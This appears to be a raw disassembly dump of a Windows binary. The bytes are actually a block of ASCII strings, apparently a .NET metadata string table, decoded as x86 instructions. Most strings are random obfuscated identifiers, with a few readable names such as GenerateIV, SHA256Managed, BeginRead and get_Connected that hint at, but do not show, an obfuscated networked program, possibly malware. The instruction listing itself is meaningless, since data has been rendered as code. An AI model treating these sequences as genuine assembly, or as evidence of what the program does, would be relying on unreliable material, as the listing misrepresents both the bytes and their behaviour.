  407fb4:	54                   	push   %esp
  407fb5:	65 59                	gs pop %ecx
  407fb7:	46                   	inc    %esi
  407fb8:	56                   	push   %esi
  407fb9:	42                   	inc    %edx
  407fba:	61                   	popa
  407fbb:	4d                   	dec    %ebp
  407fbc:	53                   	push   %ebx
  407fbd:	00 43 6e             	add    %al,0x6e(%ebx)
  407fc0:	76 58                	jbe    0x40801a
  407fc2:	4f                   	dec    %edi
  407fc3:	41                   	inc    %ecx
  407fc4:	7a 52                	jp     0x408018
  407fc6:	58                   	pop    %eax
  407fc7:	51                   	push   %ecx
  407fc8:	63 53 00             	arpl   %edx,0x0(%ebx)
  407fcb:	68 47 50 50 68       	push   $0x68505047
  407fd0:	4f                   	dec    %edi
  407fd1:	4b                   	dec    %ebx
  407fd2:	43                   	inc    %ebx
  407fd3:	49                   	dec    %ecx
  407fd4:	51                   	push   %ecx
  407fd5:	78 6e                	js     0x408045
  407fd7:	53                   	push   %ebx
  407fd8:	00 46 62             	add    %al,0x62(%esi)
  407fdb:	75 4b                	jne    0x408028
  407fdd:	75 4c                	jne    0x40802b
  407fdf:	43                   	inc    %ebx
  407fe0:	4e                   	dec    %esi
  407fe1:	4c                   	dec    %esp
  407fe2:	59                   	pop    %ecx
  407fe3:	49                   	dec    %ecx
  407fe4:	54                   	push   %esp
  407fe5:	00 41 48             	add    %al,0x48(%ecx)
  407fe8:	66 68 51 4c          	pushw  $0x4c51
  407fec:	64 6c                	fs insb (%dx),%es:(%edi)
  407fee:	55                   	push   %ebp
  407fef:	56                   	push   %esi
  407ff0:	54                   	push   %esp
  407ff1:	00 70 76             	add    %dh,0x76(%eax)
  407ff4:	52                   	push   %edx
  407ff5:	76 61                	jbe    0x408058
  407ff7:	67 69 71 45 56 58 54 	imul   $0x545856,0x45(%bx,%di),%esi
  407ffe:	00 
  407fff:	72 5a                	jb     0x40805b
  408001:	6b 4c 50 79 59       	imul   $0x59,0x79(%eax,%edx,2),%ecx
  408006:	69 71 68 47 67 54 00 	imul   $0x546747,0x68(%ecx),%esi
  40800d:	42                   	inc    %edx
  40800e:	49                   	dec    %ecx
  40800f:	50                   	push   %eax
  408010:	51                   	push   %ecx
  408011:	4a                   	dec    %edx
  408012:	79 79                	jns    0x40808d
  408014:	55                   	push   %ebp
  408015:	53                   	push   %ebx
  408016:	4f                   	dec    %edi
  408017:	6e                   	outsb  %ds:(%esi),(%dx)
  408018:	54                   	push   %esp
  408019:	00 65 70             	add    %ah,0x70(%ebp)
  40801c:	55                   	push   %ebp
  40801d:	61                   	popa
  40801e:	63 49 42             	arpl   %ecx,0x42(%ecx)
  408021:	77 6f                	ja     0x408092
  408023:	69 56 61 78 54 00 4a 	imul   $0x4a005478,0x61(%esi),%edx
  40802a:	47                   	inc    %edi
  40802b:	65 71 53             	gs jno 0x408081
  40802e:	58                   	pop    %eax
  40802f:	64 51                	fs push %ecx
  408031:	46                   	inc    %esi
  408032:	55                   	push   %ebp
  408033:	00 5a 53             	add    %bl,0x53(%edx)
  408036:	44                   	inc    %esp
  408037:	44                   	inc    %esp
  408038:	62 77 51             	bound  %esi,0x51(%edi)
  40803b:	75 42                	jne    0x40807f
  40803d:	76 46                	jbe    0x408085
  40803f:	55                   	push   %ebp
  408040:	00 51 47             	add    %dl,0x47(%ecx)
  408043:	4e                   	dec    %esi
  408044:	71 42                	jno    0x408088
  408046:	6a 42                	push   $0x42
  408048:	50                   	push   %eax
  408049:	67 72 4e             	addr16 jb 0x40809a
  40804c:	4d                   	dec    %ebp
  40804d:	6e                   	outsb  %ds:(%esi),(%dx)
  40804e:	51                   	push   %ecx
  40804f:	55                   	push   %ebp
  408050:	00 51 47             	add    %dl,0x47(%ecx)
  408053:	71 47                	jno    0x40809c
  408055:	50                   	push   %eax
  408056:	4b                   	dec    %ebx
  408057:	51                   	push   %ecx
  408058:	75 53                	jne    0x4080ad
  40805a:	55                   	push   %ebp
  40805b:	00 46 78             	add    %al,0x78(%esi)
  40805e:	6d                   	insl   (%dx),%es:(%edi)
  40805f:	4e                   	dec    %esi
  408060:	45                   	inc    %ebp
  408061:	79 6e                	jns    0x4080d1
  408063:	65 65 53             	gs gs push %ebx
  408066:	72 54                	jb     0x4080bc
  408068:	55                   	push   %ebp
  408069:	00 6d 69             	add    %ch,0x69(%ebp)
  40806c:	73 57                	jae    0x4080c5
  40806e:	62 72 53             	bound  %esi,0x53(%edx)
  408071:	58                   	pop    %eax
  408072:	41                   	inc    %ecx
  408073:	6b 4b 6c 55          	imul   $0x55,0x6c(%ebx),%ecx
  408077:	00 4a 6e             	add    %cl,0x6e(%edx)
  40807a:	59                   	pop    %ecx
  40807b:	4a                   	dec    %edx
  40807c:	56                   	push   %esi
  40807d:	6c                   	insb   (%dx),%es:(%edi)
  40807e:	52                   	push   %edx
  40807f:	72 41                	jb     0x4080c2
  408081:	66 58                	pop    %ax
  408083:	7a 74                	jp     0x4080f9
  408085:	55                   	push   %ebp
  408086:	00 6b 78             	add    %ch,0x78(%ebx)
  408089:	4b                   	dec    %ebx
  40808a:	74 52                	je     0x4080de
  40808c:	64 41                	fs inc %ecx
  40808e:	77 53                	ja     0x4080e3
  408090:	55                   	push   %ebp
  408091:	76 42                	jbe    0x4080d5
  408093:	78 55                	js     0x4080ea
  408095:	00 68 6e             	add    %ch,0x6e(%eax)
  408098:	72 73                	jb     0x40810d
  40809a:	6c                   	insb   (%dx),%es:(%edi)
  40809b:	49                   	dec    %ecx
  40809c:	73 65                	jae    0x408103
  40809e:	4f                   	dec    %edi
  40809f:	7a 55                	jp     0x4080f6
  4080a1:	00 67 65             	add    %ah,0x65(%edi)
  4080a4:	74 5f                	je     0x408105
  4080a6:	49                   	dec    %ecx
  4080a7:	56                   	push   %esi
  4080a8:	00 73 65             	add    %dh,0x65(%ebx)
  4080ab:	74 5f                	je     0x40810c
  4080ad:	49                   	dec    %ecx
  4080ae:	56                   	push   %esi
  4080af:	00 47 65             	add    %al,0x65(%edi)
  4080b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4080b3:	65 72 61             	gs jb  0x408117
  4080b6:	74 65                	je     0x40811d
  4080b8:	49                   	dec    %ecx
  4080b9:	56                   	push   %esi
  4080ba:	00 57 43             	add    %dl,0x43(%edi)
  4080bd:	76 59                	jbe    0x408118
  4080bf:	52                   	push   %edx
  4080c0:	48                   	dec    %eax
  4080c1:	6d                   	insl   (%dx),%es:(%edi)
  4080c2:	43                   	inc    %ebx
  4080c3:	4f                   	dec    %edi
  4080c4:	54                   	push   %esp
  4080c5:	56                   	push   %esi
  4080c6:	00 52 70             	add    %dl,0x70(%edx)
  4080c9:	6d                   	insl   (%dx),%es:(%edi)
  4080ca:	6c                   	insb   (%dx),%es:(%edi)
  4080cb:	6d                   	insl   (%dx),%es:(%edi)
  4080cc:	53                   	push   %ebx
  4080cd:	59                   	pop    %ecx
  4080ce:	54                   	push   %esp
  4080cf:	66 42                	inc    %dx
  4080d1:	59                   	pop    %ecx
  4080d2:	56                   	push   %esi
  4080d3:	00 4e 77             	add    %cl,0x77(%esi)
  4080d6:	4c                   	dec    %esp
  4080d7:	53                   	push   %ebx
  4080d8:	4b                   	dec    %ebx
  4080d9:	63 68 6f             	arpl   %ebp,0x6f(%eax)
  4080dc:	46                   	inc    %esi
  4080dd:	51                   	push   %ecx
  4080de:	6b 6c 5a 56 00       	imul   $0x0,0x56(%edx,%ebx,2),%ebp
  4080e3:	5a                   	pop    %edx
  4080e4:	6d                   	insl   (%dx),%es:(%edi)
  4080e5:	59                   	pop    %ecx
  4080e6:	62 4e 68             	bound  %ecx,0x68(%esi)
  4080e9:	66 79 6f             	data16 jns 0x40815b
  4080ec:	65 70 56             	gs jo  0x408145
  4080ef:	00 59 74             	add    %bl,0x74(%ecx)
  4080f2:	57                   	push   %edi
  4080f3:	52                   	push   %edx
  4080f4:	52                   	push   %edx
  4080f5:	66 71 41             	data16 jno 0x408139
  4080f8:	6b 76 56 00          	imul   $0x0,0x56(%esi),%esi
  4080fc:	73 58                	jae    0x408156
  4080fe:	59                   	pop    %ecx
  4080ff:	78 49                	js     0x40814a
  408101:	41                   	inc    %ecx
  408102:	54                   	push   %esp
  408103:	63 64 48 62          	arpl   %esp,0x62(%eax,%ecx,2)
  408107:	77 56                	ja     0x40815f
  408109:	00 67 72             	add    %ah,0x72(%edi)
  40810c:	42                   	inc    %edx
  40810d:	52                   	push   %edx
  40810e:	48                   	dec    %eax
  40810f:	66 4a                	dec    %dx
  408111:	57                   	push   %edi
  408112:	4c                   	dec    %esp
  408113:	59                   	pop    %ecx
  408114:	59                   	pop    %ecx
  408115:	41                   	inc    %ecx
  408116:	57                   	push   %edi
  408117:	00 6a 42             	add    %ch,0x42(%edx)
  40811a:	70 48                	jo     0x408164
  40811c:	78 78                	js     0x408196
  40811e:	6c                   	insb   (%dx),%es:(%edi)
  40811f:	6f                   	outsl  %ds:(%esi),(%dx)
  408120:	57                   	push   %edi
  408121:	49                   	dec    %ecx
  408122:	47                   	inc    %edi
  408123:	57                   	push   %edi
  408124:	00 57 67             	add    %dl,0x67(%edi)
  408127:	62 45 4e             	bound  %eax,0x4e(%ebp)
  40812a:	4e                   	dec    %esi
  40812b:	4a                   	dec    %edx
  40812c:	53                   	push   %ebx
  40812d:	54                   	push   %esp
  40812e:	6f                   	outsl  %ds:(%esi),(%dx)
  40812f:	49                   	dec    %ecx
  408130:	57                   	push   %edi
  408131:	00 72 73             	add    %dh,0x73(%edx)
  408134:	6d                   	insl   (%dx),%es:(%edi)
  408135:	53                   	push   %ebx
  408136:	6c                   	insb   (%dx),%es:(%edi)
  408137:	56                   	push   %esi
  408138:	52                   	push   %edx
  408139:	6b 41 55 4e          	imul   $0x4e,0x55(%ecx),%eax
  40813d:	57                   	push   %edi
  40813e:	00 6b 55             	add    %ch,0x55(%ebx)
  408141:	49                   	dec    %ecx
  408142:	6c                   	insb   (%dx),%es:(%edi)
  408143:	50                   	push   %eax
  408144:	59                   	pop    %ecx
  408145:	55                   	push   %ebp
  408146:	4d                   	dec    %ebp
  408147:	61                   	popa
  408148:	57                   	push   %edi
  408149:	00 67 56             	add    %ah,0x56(%edi)
  40814c:	69 43 56 6a 79 71 6e 	imul   $0x6e71796a,0x56(%ebx),%eax
  408153:	63 6d 57             	arpl   %ebp,0x57(%ebp)
  408156:	00 70 41             	add    %dh,0x41(%eax)
  408159:	47                   	inc    %edi
  40815a:	67 5a                	addr16 pop %edx
  40815c:	56                   	push   %esi
  40815d:	47                   	inc    %edi
  40815e:	74 75                	je     0x4081d5
  408160:	53                   	push   %ebx
  408161:	71 57                	jno    0x4081ba
  408163:	00 79 62             	add    %bh,0x62(%ecx)
  408166:	64 6f                	outsl  %fs:(%esi),(%dx)
  408168:	77 69                	ja     0x4081d3
  40816a:	64 77 7a             	fs ja  0x4081e7
  40816d:	65 72 57             	gs jb  0x4081c7
  408170:	00 69 45             	add    %ch,0x45(%ecx)
  408173:	68 42 46 55 6f       	push   $0x6f554642
  408178:	4d                   	dec    %ebp
  408179:	71 74                	jno    0x4081ef
  40817b:	4d                   	dec    %ebp
  40817c:	51                   	push   %ecx
  40817d:	76 57                	jbe    0x4081d6
  40817f:	00 61 77             	add    %ah,0x77(%ecx)
  408182:	75 47                	jne    0x4081cb
  408184:	4e                   	dec    %esi
  408185:	75 76                	jne    0x4081fd
  408187:	6a 4a                	push   $0x4a
  408189:	69 79 41 58 00 77 61 	imul   $0x61770058,0x41(%ecx),%edi
  408190:	78 65                	js     0x4081f7
  408192:	70 79                	jo     0x40820d
  408194:	6f                   	outsl  %ds:(%esi),(%dx)
  408195:	4a                   	dec    %edx
  408196:	74 71                	je     0x408209
  408198:	64 45                	fs inc %ebp
  40819a:	58                   	pop    %eax
  40819b:	00 63 6b             	add    %ah,0x6b(%ebx)
  40819e:	48                   	dec    %eax
  40819f:	79 57                	jns    0x4081f8
  4081a1:	59                   	pop    %ecx
  4081a2:	5a                   	pop    %edx
  4081a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4081a4:	42                   	inc    %edx
  4081a5:	62 4c 72 56          	bound  %ecx,0x56(%edx,%esi,2)
  4081a9:	69 51 58 00 54 70 47 	imul   $0x47705400,0x58(%ecx),%edx
  4081b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4081b1:	4c                   	dec    %esp
  4081b2:	62 44 73 4c          	bound  %eax,0x4c(%ebx,%esi,2)
  4081b6:	50                   	push   %eax
  4081b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4081b8:	58                   	pop    %eax
  4081b9:	00 7a 4f             	add    %bh,0x4f(%edx)
  4081bc:	4a                   	dec    %edx
  4081bd:	69 45 49 6f 73 56 67 	imul   $0x6756736f,0x49(%ebp),%eax
  4081c4:	4a                   	dec    %edx
  4081c5:	44                   	inc    %esp
  4081c6:	59                   	pop    %ecx
  4081c7:	00 65 4b             	add    %ah,0x4b(%ebp)
  4081ca:	41                   	inc    %ecx
  4081cb:	4b                   	dec    %ebx
  4081cc:	79 70                	jns    0x40823e
  4081ce:	63 6e 57             	arpl   %ebp,0x57(%esi)
  4081d1:	44                   	inc    %esp
  4081d2:	59                   	pop    %ecx
  4081d3:	00 5a 48             	add    %bl,0x48(%edx)
  4081d6:	76 4c                	jbe    0x408224
  4081d8:	54                   	push   %esp
  4081d9:	76 4c                	jbe    0x408227
  4081db:	56                   	push   %esi
  4081dc:	6d                   	insl   (%dx),%es:(%edi)
  4081dd:	64 51                	fs push %ecx
  4081df:	6e                   	outsb  %ds:(%esi),(%dx)
  4081e0:	48                   	dec    %eax
  4081e1:	59                   	pop    %ecx
  4081e2:	00 4b 69             	add    %cl,0x69(%ebx)
  4081e5:	48                   	dec    %eax
  4081e6:	6a 49                	push   $0x49
  4081e8:	65 47                	gs inc %edi
  4081ea:	51                   	push   %ecx
  4081eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ed:	68 4f 69 50 59       	push   $0x5950694f
  4081f2:	00 54 65 63          	add    %dl,0x63(%ebp,%eiz,2)
  4081f6:	4a                   	dec    %edx
  4081f7:	71 4f                	jno    0x408248
  4081f9:	71 69                	jno    0x408264
  4081fb:	72 4c                	jb     0x408249
  4081fd:	50                   	push   %eax
  4081fe:	71 55                	jno    0x408255
  408200:	59                   	pop    %ecx
  408201:	00 57 7a             	add    %dl,0x7a(%edi)
  408204:	55                   	push   %ebp
  408205:	4d                   	dec    %ebp
  408206:	64 4c                	fs dec %esp
  408208:	74 6f                	je     0x408279
  40820a:	51                   	push   %ecx
  40820b:	62 70 73             	bound  %esi,0x73(%eax)
  40820e:	56                   	push   %esi
  40820f:	59                   	pop    %ecx
  408210:	00 51 78             	add    %dl,0x78(%ecx)
  408213:	48                   	dec    %eax
  408214:	4b                   	dec    %ebx
  408215:	62 59 4a             	bound  %ebx,0x4a(%ecx)
  408218:	45                   	inc    %ebp
  408219:	76 62                	jbe    0x40827d
  40821b:	7a 77                	jp     0x408294
  40821d:	66 59                	pop    %cx
  40821f:	00 64 75 6a          	add    %ah,0x6a(%ebp,%esi,2)
  408223:	51                   	push   %ecx
  408224:	46                   	inc    %esi
  408225:	7a 64                	jp     0x40828b
  408227:	76 78                	jbe    0x4082a1
  408229:	7a 71                	jp     0x40829c
  40822b:	59                   	pop    %ecx
  40822c:	00 49 43             	add    %cl,0x43(%ecx)
  40822f:	6e                   	outsb  %ds:(%esi),(%dx)
  408230:	77 75                	ja     0x4082a7
  408232:	4a                   	dec    %edx
  408233:	79 4c                	jns    0x408281
  408235:	49                   	dec    %ecx
  408236:	73 65                	jae    0x40829d
  408238:	75 59                	jne    0x408293
  40823a:	00 59 4f             	add    %bl,0x4f(%ecx)
  40823d:	72 7a                	jb     0x4082b9
  40823f:	6e                   	outsb  %ds:(%esi),(%dx)
  408240:	55                   	push   %ebp
  408241:	53                   	push   %ebx
  408242:	51                   	push   %ecx
  408243:	6d                   	insl   (%dx),%es:(%edi)
  408244:	4c                   	dec    %esp
  408245:	53                   	push   %ebx
  408246:	4f                   	dec    %edi
  408247:	51                   	push   %ecx
  408248:	41                   	inc    %ecx
  408249:	5a                   	pop    %edx
  40824a:	00 4d 4f             	add    %cl,0x4f(%ebp)
  40824d:	69 73 46 4d 4b 61 59 	imul   $0x59614b4d,0x46(%ebx),%esi
  408254:	44                   	inc    %esp
  408255:	6b 45 5a 00          	imul   $0x0,0x5a(%ebp),%eax
  408259:	76 56                	jbe    0x4082b1
  40825b:	47                   	inc    %edi
  40825c:	46                   	inc    %esi
  40825d:	70 7a                	jo     0x4082d9
  40825f:	48                   	dec    %eax
  408260:	77 7a                	ja     0x4082dc
  408262:	77 47                	ja     0x4082ab
  408264:	5a                   	pop    %edx
  408265:	00 79 4c             	add    %bh,0x4c(%ecx)
  408268:	4d                   	dec    %ebp
  408269:	4c                   	dec    %esp
  40826a:	75 79                	jne    0x4082e5
  40826c:	78 74                	js     0x4082e2
  40826e:	47                   	inc    %edi
  40826f:	52                   	push   %edx
  408270:	5a                   	pop    %edx
  408271:	5a                   	pop    %edx
  408272:	00 51 4b             	add    %dl,0x4b(%ecx)
  408275:	77 4c                	ja     0x4082c3
  408277:	6b 51 55 73          	imul   $0x73,0x55(%ecx),%edx
  40827b:	66 5a                	pop    %dx
  40827d:	00 58 48             	add    %bl,0x48(%eax)
  408280:	50                   	push   %eax
  408281:	72 4d                	jb     0x4082d0
  408283:	6d                   	insl   (%dx),%es:(%edi)
  408284:	64 51                	fs push %ecx
  408286:	4b                   	dec    %ebx
  408287:	6e                   	outsb  %ds:(%esi),(%dx)
  408288:	5a                   	pop    %edx
  408289:	00 67 79             	add    %ah,0x79(%edi)
  40828c:	43                   	inc    %ebx
  40828d:	75 46                	jne    0x4082d5
  40828f:	6b 46 79 44          	imul   $0x44,0x79(%esi),%eax
  408293:	48                   	dec    %eax
  408294:	73 5a                	jae    0x4082f0
  408296:	00 4a 42             	add    %cl,0x42(%edx)
  408299:	48                   	dec    %eax
  40829a:	7a 68                	jp     0x408304
  40829c:	6a 45                	push   $0x45
  40829e:	42                   	inc    %edx
  40829f:	49                   	dec    %ecx
  4082a0:	74 5a                	je     0x4082fc
  4082a2:	00 76 61             	add    %dh,0x61(%esi)
  4082a5:	6c                   	insb   (%dx),%es:(%edi)
  4082a6:	75 65                	jne    0x40830d
  4082a8:	5f                   	pop    %edi
  4082a9:	5f                   	pop    %edi
  4082aa:	00 6a 47             	add    %ch,0x47(%edx)
  4082ad:	61                   	popa
  4082ae:	62 73 4e             	bound  %esi,0x4e(%ebx)
  4082b1:	74 4e                	je     0x408301
  4082b3:	71 52                	jno    0x408307
  4082b5:	58                   	pop    %eax
  4082b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4082b7:	50                   	push   %eax
  4082b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4082b9:	4a                   	dec    %edx
  4082ba:	61                   	popa
  4082bb:	00 44 43 4b          	add    %al,0x4b(%ebx,%eax,2)
  4082bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4082c0:	52                   	push   %edx
  4082c1:	4a                   	dec    %edx
  4082c2:	54                   	push   %esp
  4082c3:	54                   	push   %esp
  4082c4:	54                   	push   %esp
  4082c5:	64 49                	fs dec %ecx
  4082c7:	7a 4c                	jp     0x408315
  4082c9:	61                   	popa
  4082ca:	00 79 6a             	add    %bh,0x6a(%ecx)
  4082cd:	75 78                	jne    0x408347
  4082cf:	4c                   	dec    %esp
  4082d0:	6c                   	insb   (%dx),%es:(%edi)
  4082d1:	4d                   	dec    %ebp
  4082d2:	72 53                	jb     0x408327
  4082d4:	61                   	popa
  4082d5:	00 4f 48             	add    %cl,0x48(%edi)
  4082d8:	63 4d 58             	arpl   %ecx,0x58(%ebp)
  4082db:	4f                   	dec    %edi
  4082dc:	49                   	dec    %ecx
  4082dd:	78 78                	js     0x408357
  4082df:	6d                   	insl   (%dx),%es:(%edi)
  4082e0:	49                   	dec    %ecx
  4082e1:	62 61 00             	bound  %esp,0x0(%ecx)
  4082e4:	69 72 71 6c 7a 75 74 	imul   $0x74757a6c,0x71(%edx),%esi
  4082eb:	78 68                	js     0x408355
  4082ed:	4d                   	dec    %ebp
  4082ee:	79 63                	jns    0x408353
  4082f0:	6a 61                	push   $0x61
  4082f2:	00 73 68             	add    %dh,0x68(%ebx)
  4082f5:	6c                   	insb   (%dx),%es:(%edi)
  4082f6:	52                   	push   %edx
  4082f7:	42                   	inc    %edx
  4082f8:	4a                   	dec    %edx
  4082f9:	68 69 72 45 77       	push   $0x77457269
  4082fe:	41                   	inc    %ecx
  4082ff:	79 61                	jns    0x408362
  408301:	00 47 71             	add    %al,0x71(%edi)
  408304:	4c                   	dec    %esp
  408305:	68 4b 4b 6a 55       	push   $0x556a4b4b
  40830a:	42                   	inc    %edx
  40830b:	55                   	push   %ebp
  40830c:	79 61                	jns    0x40836f
  40830e:	00 54 6e 6f          	add    %dl,0x6f(%esi,%ebp,2)
  408312:	42                   	inc    %edx
  408313:	43                   	inc    %ebx
  408314:	70 4f                	jo     0x408365
  408316:	59                   	pop    %ecx
  408317:	6c                   	insb   (%dx),%es:(%edi)
  408318:	4f                   	dec    %edi
  408319:	4e                   	dec    %esi
  40831a:	53                   	push   %ebx
  40831b:	42                   	inc    %edx
  40831c:	62 00                	bound  %eax,(%eax)
  40831e:	68 7a 53 69 46       	push   $0x4669537a
  408323:	4d                   	dec    %ebp
  408324:	67 4e                	addr16 dec %esi
  408326:	4a                   	dec    %edx
  408327:	62 00                	bound  %eax,(%eax)
  408329:	48                   	dec    %eax
  40832a:	4b                   	dec    %ebx
  40832b:	68 54 46 4d 48       	push   $0x484d4654
  408330:	77 6b                	ja     0x40839d
  408332:	4b                   	dec    %ebx
  408333:	62 00                	bound  %eax,(%eax)
  408335:	56                   	push   %esi
  408336:	75 4f                	jne    0x408387
  408338:	55                   	push   %ebp
  408339:	74 58                	je     0x408393
  40833b:	58                   	pop    %eax
  40833c:	69 46 47 50 52 55 62 	imul   $0x62555250,0x47(%esi),%eax
  408343:	00 6d 73             	add    %ch,0x73(%ebp)
  408346:	63 6f 72             	arpl   %ebp,0x72(%edi)
  408349:	6c                   	insb   (%dx),%es:(%edi)
  40834a:	69 62 00 59 52 42 44 	imul   $0x44425259,0x0(%edx),%esp
  408351:	79 77                	jns    0x4083ca
  408353:	4c                   	dec    %esp
  408354:	41                   	inc    %ecx
  408355:	42                   	inc    %edx
  408356:	63 00                	arpl   %eax,(%eax)
  408358:	4e                   	dec    %esi
  408359:	6c                   	insb   (%dx),%es:(%edi)
  40835a:	4c                   	dec    %esp
  40835b:	61                   	popa
  40835c:	69 49 6e 6b 4d 78 50 	imul   $0x50784d6b,0x6e(%ecx),%ecx
  408363:	44                   	inc    %esp
  408364:	63 00                	arpl   %eax,(%eax)
  408366:	6f                   	outsl  %ds:(%esi),(%dx)
  408367:	4f                   	dec    %edi
  408368:	6b 57 77 68          	imul   $0x68,0x77(%edi),%edx
  40836c:	72 4f                	jb     0x4083bd
  40836e:	6c                   	insb   (%dx),%es:(%edi)
  40836f:	4c                   	dec    %esp
  408370:	63 00                	arpl   %eax,(%eax)
  408372:	62 77 6a             	bound  %esi,0x6a(%edi)
  408375:	58                   	pop    %eax
  408376:	57                   	push   %edi
  408377:	46                   	inc    %esi
  408378:	4f                   	dec    %edi
  408379:	6a 58                	push   $0x58
  40837b:	71 51                	jno    0x4083ce
  40837d:	55                   	push   %ebp
  40837e:	63 00                	arpl   %eax,(%eax)
  408380:	41                   	inc    %ecx
  408381:	59                   	pop    %ecx
  408382:	77 75                	ja     0x4083f9
  408384:	79 53                	jns    0x4083d9
  408386:	69 51 53 5a 63 00 59 	imul   $0x5900635a,0x53(%ecx),%edx
  40838d:	68 6f 59 4a 64       	push   $0x644a596f
  408392:	4c                   	dec    %esp
  408393:	55                   	push   %ebp
  408394:	4c                   	dec    %esp
  408395:	7a 63                	jp     0x4083fa
  408397:	63 00                	arpl   %eax,(%eax)
  408399:	6b 5a 54 73          	imul   $0x73,0x54(%edx),%ebx
  40839d:	58                   	pop    %eax
  40839e:	6c                   	insb   (%dx),%es:(%edi)
  40839f:	5a                   	pop    %edx
  4083a0:	53                   	push   %ebx
  4083a1:	63 4c 67 63          	arpl   %ecx,0x63(%edi,%eiz,2)
  4083a5:	00 53 79             	add    %dl,0x79(%ebx)
  4083a8:	73 74                	jae    0x40841e
  4083aa:	65 6d                	gs insl (%dx),%es:(%edi)
  4083ac:	2e 43                	cs inc %ebx
  4083ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4083af:	6c                   	insb   (%dx),%es:(%edi)
  4083b0:	6c                   	insb   (%dx),%es:(%edi)
  4083b1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4083b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4083b7:	73 2e                	jae    0x4083e7
  4083b9:	47                   	inc    %edi
  4083ba:	65 6e                	outsb  %gs:(%esi),(%dx)
  4083bc:	65 72 69             	gs jb  0x408428
  4083bf:	63 00                	arpl   %eax,(%eax)
  4083c1:	4d                   	dec    %ebp
  4083c2:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4083c9:	74 2e                	je     0x4083f9
  4083cb:	56                   	push   %esi
  4083cc:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4083d3:	73 69                	jae    0x40843e
  4083d5:	63 00                	arpl   %eax,(%eax)
  4083d7:	44                   	inc    %esp
  4083d8:	64 52                	fs push %edx
  4083da:	62 66 74             	bound  %esp,0x74(%esi)
  4083dd:	42                   	inc    %edx
  4083de:	65 42                	gs inc %edx
  4083e0:	75 74                	jne    0x408456
  4083e2:	75 67                	jne    0x40844b
  4083e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e5:	63 00                	arpl   %eax,(%eax)
  4083e7:	67 65 74 5f          	addr16 gs je 0x40844a
  4083eb:	53                   	push   %ebx
  4083ec:	65 6e                	outsb  %gs:(%esi),(%dx)
  4083ee:	64 53                	fs push %ebx
  4083f0:	79 6e                	jns    0x408460
  4083f2:	63 00                	arpl   %eax,(%eax)
  4083f4:	6d                   	insl   (%dx),%es:(%edi)
  4083f5:	4a                   	dec    %edx
  4083f6:	78 67                	js     0x40845f
  4083f8:	7a 44                	jp     0x40843e
  4083fa:	72 6a                	jb     0x408466
  4083fc:	66 58                	pop    %ax
  4083fe:	47                   	inc    %edi
  4083ff:	41                   	inc    %ecx
  408400:	64 00 63 4e          	add    %ah,%fs:0x4e(%ebx)
  408404:	71 61                	jno    0x408467
  408406:	56                   	push   %esi
  408407:	54                   	push   %esp
  408408:	59                   	pop    %ecx
  408409:	63 69 4b             	arpl   %ebp,0x4b(%ecx)
  40840c:	76 77                	jbe    0x408485
  40840e:	42                   	inc    %edx
  40840f:	64 00 46 74          	add    %al,%fs:0x74(%esi)
  408413:	77 47                	ja     0x40845c
  408415:	74 49                	je     0x408460
  408417:	41                   	inc    %ecx
  408418:	50                   	push   %eax
  408419:	66 4c                	dec    %sp
  40841b:	74 5a                	je     0x408477
  40841d:	46                   	inc    %esi
  40841e:	64 00 43 78          	add    %al,%fs:0x78(%ebx)
  408422:	6e                   	outsb  %ds:(%esi),(%dx)
  408423:	50                   	push   %eax
  408424:	42                   	inc    %edx
  408425:	75 6e                	jne    0x408495
  408427:	71 49                	jno    0x408472
  408429:	54                   	push   %esp
  40842a:	57                   	push   %edi
  40842b:	4c                   	dec    %esp
  40842c:	4b                   	dec    %ebx
  40842d:	64 00 4f 69          	add    %cl,%fs:0x69(%edi)
  408431:	43                   	inc    %ebx
  408432:	41                   	inc    %ecx
  408433:	47                   	inc    %edi
  408434:	76 58                	jbe    0x40848e
  408436:	6a 4d                	push   $0x4d
  408438:	64 00 76 4f          	add    %dh,%fs:0x4f(%esi)
  40843c:	49                   	dec    %ecx
  40843d:	4d                   	dec    %ebp
  40843e:	46                   	inc    %esi
  40843f:	66 46                	inc    %si
  408441:	62 50 64             	bound  %edx,0x64(%eax)
  408444:	00 45 6e             	add    %al,0x6e(%ebp)
  408447:	64 52                	fs push %edx
  408449:	65 61                	gs popa
  40844b:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  40844f:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  408456:	00 
  408457:	54                   	push   %esp
  408458:	68 72 65 61 64       	push   $0x64616572
  40845d:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  408461:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  408465:	64 00 74 58 65       	add    %dh,%fs:0x65(%eax,%ebx,2)
  40846a:	44                   	inc    %esp
  40846b:	48                   	dec    %eax
  40846c:	4e                   	dec    %esi
  40846d:	45                   	inc    %ebp
  40846e:	70 46                	jo     0x4084b6
  408470:	65 64 00 53 48       	gs add %dl,%fs:0x48(%ebx)
  408475:	41                   	inc    %ecx
  408476:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  40847c:	61                   	popa
  40847d:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  408483:	74 5f                	je     0x4084e4
  408485:	43                   	inc    %ebx
  408486:	6f                   	outsl  %ds:(%esi),(%dx)
  408487:	6e                   	outsb  %ds:(%esi),(%dx)
  408488:	6e                   	outsb  %ds:(%esi),(%dx)
  408489:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40848e:	00 67 65             	add    %ah,0x65(%edi)
  408491:	74 5f                	je     0x4084f2
  408493:	49                   	dec    %ecx
  408494:	73 43                	jae    0x4084d9
  408496:	6f                   	outsl  %ds:(%esi),(%dx)
